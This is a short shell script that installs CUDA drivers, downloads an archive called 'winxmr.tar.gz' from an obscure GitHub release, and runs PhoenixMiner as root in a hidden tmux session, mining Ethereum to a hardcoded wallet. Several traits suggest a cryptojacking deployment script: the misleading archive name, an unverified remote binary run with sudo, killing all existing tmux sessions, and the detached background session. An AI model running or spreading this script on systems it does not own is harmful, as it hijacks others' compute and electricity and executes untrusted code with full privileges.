#!/bin/sh
sudo sysctl -p
sudo apt-get update
cd /usr/local/bin/
sudo apt-get -y -qq upgrade
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev unzip tmux
sudo apt-get install linux-headers-$(uname -r)
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-get update
sudo apt-get -y install cuda-drivers
export PATH=/usr/local/cuda-11.2/bin${PATH:+:${PATH}}
wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
tar -zxvf winxmr.tar.gz
tmux kill-server
sleep 1
sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool asia1.ethermine.org:4444 -wal 0xa4c5a0f1085edff61a41a1b51817860ed45731c2.D2021 -pass x'

